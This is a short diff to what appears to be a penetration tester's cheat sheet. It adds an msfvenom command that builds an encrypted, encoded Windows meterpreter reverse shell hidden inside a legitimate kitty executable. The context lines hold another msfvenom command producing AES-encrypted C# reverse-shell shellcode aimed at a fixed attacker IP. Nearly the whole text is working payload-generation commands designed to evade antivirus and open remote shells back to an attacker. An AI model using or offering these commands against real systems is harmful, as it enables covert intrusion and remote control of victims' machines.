@@ -36,6 +36,12 @@ IE      p4yl0ad History  https://p4yl0ad.github.io/
 
 ****
 
+exe
+```
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=443 --arch x64 --platform windows --encoder x64/xor_dynamic --encrypt-iv --encrypt
+rc4 --encrypt-key neoncatkeysignature --iterations 60 --timeout 10 -b '\x00' -n 22 -x kitty-0.74.4.11.exe -f exe > neoncat1.exe
+```
+
 Encrypting C# shellcode
 ```
 msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.152.100 LPORT=80 -f csharp --encrypt aes256 --encrypt-key 12345678901234567890123456789012 --encrypt-iv 1234567890123456
